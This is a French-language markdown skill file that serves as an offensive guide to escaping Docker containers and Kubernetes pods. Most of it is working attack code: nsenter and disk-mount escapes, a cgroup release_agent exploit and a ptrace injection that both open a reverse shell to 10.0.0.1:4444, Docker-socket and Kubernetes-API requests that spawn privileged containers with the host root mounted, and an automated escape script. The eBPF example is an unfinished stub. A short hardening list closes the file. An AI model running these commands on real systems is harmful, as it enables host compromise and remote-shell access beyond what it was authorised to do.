---
name: container-escape
description: Guide complet d'évasion de conteneur Docker — CVE exploitation, mount escape, capabilities abuse, cgroup escape, eBPF, seccomp bypass, nsenter, et outils.
category: cybersecurite
tags: [container, docker, escape, privileged, cgroup, eBPF, seccomp, kubernetes, linux-namespaces]
---

# Évasion de Conteneur (Container Escape)

## Sommaire
1. [Linux Namespaces et Conteneurs](#linux-namespaces-et-conteneurs)
2. [Mode Privileged](#mode-privileged)
3. [Mount Escape](#mount-escape)
4. [Capabilities Abuse](#capabilities-abuse)
5. [Cgroup Escape](#cgroup-escape)
6. [eBPF Attacks](#ebpf-attacks)
7. [Seccomp Bypass](#seccomp-bypass)
8. [Docker Socket Mount](#docker-socket-mount)
9. [Kubernetes Node Escape](#kubernetes-node-escape)
10. [Outils](#outils)

## Linux Namespaces et Conteneurs

### Vérification de l'environnement conteneurisé :
```bash
# Détecter si on est dans un conteneur
cat /proc/1/cgroup | grep -i docker
cat /proc/1/cgroup | grep -i kubepods
cat /proc/self/mountinfo | grep -i docker
ls /.dockerenv 2>/dev/null && echo "Docker container"

# Voir les namespaces
ls -la /proc/self/ns/
cat /proc/1/environ

# Voir les cgroups
cat /proc/self/cgroup
mount | grep cgroup
```

## Mode Privileged

Un conteneur privilégié (`--privileged`) a TOUS les capabilities et accès
direct au host.

### Détection :
```bash
# Vérifier si le conteneur est privilégié
cat /proc/self/status | grep CapEff
# Si CapEff = 0000003fffffffff → conteneur privilégié

# Ou avec capsh
capsh --print | grep -i current

# Voir les devices accessibles
ls -la /dev/
cat /proc/self/status | grep Cap
```

### Escape depuis un conteneur privilégié :
```bash
# Méthode 1: Mount du filesystem host
mkdir /tmp/host
mount -t proc none /tmp/host/proc

# Méthode 2: nsenter dans le namespace host
nsenter --target 1 --mount --uts --ipc --pid -- bash
# Maintenant on est dans le namespace PID du host

# Méthode 3: fdisk pour trouver les partitions
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host bash
```

### Script d'escape privilégié :
```bash
#!/bin/bash
# Container Escape depuis conteneur privilégié

# Tenter nsenter
nsenter --target 1 --mount --uts --ipc --pid -- /bin/bash 2>/dev/null
if [ $? -eq 0 ]; then
    echo "[+] nsenter réussi !"
    exit 0
fi

# Tenter mount
mkdir -p /mnt/host
for dev in $(ls /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null); do
    mount $dev /mnt/host 2>/dev/null && echo "[+] Monté: $dev" && chroot /mnt/host /bin/bash
done
```

## Mount Escape

### Avec /var/run/docker.sock monté :
```bash
# Détection
ls -la /var/run/docker.sock

# Escape : lancer un nouveau conteneur avec mount du host
docker run -v /:/host -it alpine chroot /host /bin/bash

# Ou sans Docker CLI
curl -s --unix-socket /var/run/docker.sock \
  -X POST -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["chroot","/host","/bin/bash"],"Binds":["/:/host"]}' \
  http://localhost/containers/create

# Démarrer le conteneur
curl --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/<ID>/start
```

### Avec mount d'un device host :
```bash
# Si des devices sont montés du host
mount | grep /dev
cat /proc/mounts

# Exploitation
mkdir /tmp/roots
mount /dev/sda1 /tmp/roots
chroot /tmp/roots bash
```

## Capabilities Abuse

### Capabilities exploitables :
```
CAP_SYS_ADMIN   → mount, nsenter, accès complet
CAP_NET_ADMIN   → modifier les règles réseau
CAP_SYS_PTRACE  → ptrace sur les processus host
CAP_SYS_RAWIO   → accès mémoire (/dev/mem)
CAP_DAC_OVERRIDE→ bypass permissions fichiers
CAP_SYS_MODULE  → charger des modules kernel
```

### Détection des capabilities :
```bash
# Lister les capabilities du conteneur
cat /proc/self/status | grep Cap
capsh --print

# Décoder CapEff
capsh --decode=00000000a80425fb
```

### Escape via CAP_SYS_ADMIN :
```bash
# Avec CAP_SYS_ADMIN, on peut monter des filesystems
mkdir /tmp/cgroup
mount -t cgroup -o memory cgroup /tmp/cgroup
mkdir /tmp/cgroup/x

# Créer un processus dans le cgroup host
echo 1 > /tmp/cgroup/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgroup/x/release_agent

# Créer le script qui s'exécutera sur le host
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> /cmd
chmod +x /cmd

# Déclencher l'escape
sh -c "echo \$\$ > /tmp/cgroup/x/cgroup.procs"
```

### Escape via CAP_SYS_PTRACE :
```bash
# Ptrace sur un processus host
apt-get update && apt-get install -y gdb
gdb -p 1  # PID 1 du host (si accessible)
# Dans gdb : call system("bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'")
```

## Cgroup Escape

### Via release_agent (CAP_SYS_ADMIN requis) :
```bash
# Technique cgroup release_agent
# Fonctionne quand /sys/fs/cgroup est accessible en écriture

mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null

if [ $? -eq 0 ]; then
    mkdir /tmp/cgrp/x
    
    # Config release_agent
    echo 1 > /tmp/cgrp/x/notify_on_release
    
    # Trouver le path host
    HOST_PATH=$(mount | grep -oP 'upperdir=\K[^,]*' | head -1)
    
    # Script d'escape
    echo '#!/bin/bash' > /escape.sh
    echo "id > ${HOST_PATH}/output" >> /escape.sh
    chmod +x /escape.sh
    
    # Pointer release_agent vers notre script
    echo "/escape.sh" > /tmp/cgrp/release_agent
    
    # Déclencher
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
    
    cat /output 2>/dev/null && echo "[+] Cgroup escape réussi !"
fi
```

## eBPF Attacks

### Détection :
```bash
# Vérifier si eBPF est disponible
ls /sys/fs/bpf/
cat /proc/sys/kernel/unprivileged_bpf_disabled
# 0 = unprivileged BPF activé (vulnérable)
```

### Exploitation via eBPF (CAP_BPF ou accès à /sys/fs/bpf) :
```c
// ebpf_escape.c - Attaque eBPF pour lire la mémoire du host
#include <linux/bpf.h>
#include <bpf/libbpf.h>

// Programme eBPF qui lit /etc/shadow du host
SEC("kprobe/sys_execve")
int kprobe_exec(struct pt_regs *ctx) {
    // Lire et écrire dans la mémoire du host
    // ...
}
```
```bash
# Compiler et charger
clang -O2 -target bpf -c ebpf_escape.c -o ebpf_escape.o
bpftool prog load ebpf_escape.o /sys/fs/bpf/escape
bpftool prog attach pinned /sys/fs/bpf/escape kprobe
```

## Seccomp Bypass

### Détection de seccomp :
```bash
# Vérifier si seccomp est actif
cat /proc/self/status | grep Seccomp
# 0 = désactivé, 1 = strict, 2 = filtered

# Voir les syscalls filtrées (si Seccomp=2)
cat /proc/self/status | grep Seccomp
```

### Bypass si seccomp est permissif :
```bash
# Si Seccomp=2 mais la liste autorise clone(), unshare(), mount()
# Mêmes techniques cgroup que ci-dessus

# Vérifier les syscalls disponibles
strace -c ls /tmp 2>&1 | head -20
```

## Docker Socket Mount

### Détection :
```bash
# Vérifier si Docker socket est monté
ls -la /var/run/docker.sock 2>/dev/null
ls -la /run/docker.sock 2>/dev/null

# Via Docker CLI
docker ps 2>/dev/null && echo "[+] Docker CLI disponible"
```

### Escape via Docker socket :
```bash
# Lancer un conteneur privilégié avec mount du root host
docker run -it --rm -v /:/host alpine chroot /host /bin/bash

# Créer un conteneur avec tous les capabilities
docker run --rm --privileged -v /:/host alpine chroot /host bash

# Version HTTP API
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "busybox",
    "Cmd": ["/bin/sh"],
    "HostConfig": {
      "Binds": ["/:/mnt:rw"],
      "Privileged": true,
      "PidMode": "host"
    }
  }'
```

## Kubernetes Node Escape

### Depuis un pod Kubernetes :

```bash
# Vérifier l'environnement K8s
env | grep -i kubernetes
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"

# Tester l'accès API
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/nodes

# Si token a les droits → créer un pod privilégié
curl -k -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST $APISERVER/api/v1/namespaces/default/pods \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "escape-pod"},
    "spec": {
      "containers": [{
        "name": "escape",
        "image": "alpine",
        "command": ["chroot", "/host", "/bin/bash"],
        "volumeMounts": [{"name": "host", "mountPath": "/host"}],
        "securityContext": {"privileged": true}
      }],
      "volumes": [{"name": "host", "hostPath": {"path": "/"}}],
      "automountServiceAccountToken": true,
      "hostPID": true
    }
  }'
```

## Outils

### amicontained (détection) :
```bash
# Détection de conteneurisation
git clone https://github.com/genuinetools/amicontained.git
go build -o amicontained
./amicontained
```

### Deepce (Docker Exploitation) :
```bash
git clone https://github.com/stealthcopter/deepce.git
cd deepce
chmod +x deepce.sh

# Scan d'escape
./deepce.sh --quick

# Exploitation automatisée
./deepce.sh --full
```

### CDK (Container Defense Kit) :
```bash
git clone https://github.com/cdk-team/CDK.git
cd cdk

# Énumération
./cdk evaluate

# Escape privilégié
./cdk run mount-disk
./cdk run docker-sock-check

# Reverse shell
./cdk reverse 10.0.0.1 4444
```

### Script d'escape automatisé :
```bash
#!/bin/bash
# Container Escape - Multi-technique

echo "[*] Vérification environnement..."
cat /proc/1/cgroup 2>/dev/null
cat /proc/self/status | grep Cap

echo "[*] Test nsenter..."
nsenter --target 1 --mount --uts --ipc --pid -- /bin/bash -c "id" && echo "[+] nsenter OK"

echo "[*] Test mount..."
fdisk -l 2>/dev/null | grep /dev/

echo "[*] Test Docker socket..."
ls -la /var/run/docker.sock 2>/dev/null && echo "[+] Docker socket disponible"

echo "[*] Test cgroup..."
mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null && echo "[+] Cgroup exploitable"

echo "[*] Test release_agent..."
if [ -f /sys/fs/cgroup/memory/notify_on_release ]; then
    echo "[+] notify_on_release accessible"
fi
```

## Protections
- **Ne pas utiliser `--privileged`** en production
- **Minimiser les capabilities** (dropper `--cap-drop=ALL --cap-add=NEEDED`)
- **SELinux/AppArmor profiles** renforcés
- **Seccomp profiles** restrictifs (bloquer mount, clone, unshare)
- **Read-only root filesystem** (`--read-only`)
- **No new privileges** (`--security-opt=no-new-privileges`)
- **User namespace remapping** (userns-remap)
- **Pod Security Standards** (Kubernetes : Baseline/Restricted)

## Ressources
- **HackTricks Container Escape** : https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout
- **Container Escape Techniques** (TrailOfBits) : https://github.com/trailofbits/container-escape
- **Deepce** : https://github.com/stealthcopter/deepce
- **CDK** : https://github.com/cdk-team/CDK
- **amicontained** : https://github.com/genuinetools/amicontained
- **Docker Security Documentation** : https://docs.docker.com/engine/security/
- **Kubernetes Pod Security** : https://kubernetes.io/docs/concepts/security/pod-security-standards/